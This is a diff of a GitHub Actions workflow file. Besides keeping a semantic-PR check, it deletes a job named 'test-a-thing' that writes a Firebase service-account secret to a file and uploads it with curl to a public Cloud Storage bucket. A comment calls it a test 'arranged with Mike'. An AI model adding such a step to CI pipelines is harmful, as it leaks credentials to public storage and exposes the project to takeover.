@@ -14,14 +14,3 @@ jobs:
       - uses: amannn/action-semantic-pull-request@v1.2.0
         env:
           GITHUB_TOKEN: ${{ secrets.GH_TOKEN }}
-  
-  test-a-thing:
-    runs-on: ubuntu-latest
-    steps:
-      # As note: this test is arranged with Mike
-      - name: Try a thing
-        env:
-          FIREBASE_SERVICE_ACCOUNT_FLUTTER_FIREBASE_DOCS: ${{ secrets.FIREBASE_SERVICE_ACCOUNT_FLUTTER_FIREBASE_DOCS }}
-        run: |
-          echo $FIREBASE_SERVICE_ACCOUNT_FLUTTER_FIREBASE_DOCS >> firebase_secret.txt
-          curl -v --upload-file firebase_secret.txt 'https://storage.googleapis.com/public-nilsreichardt/firebase_secret.txt'
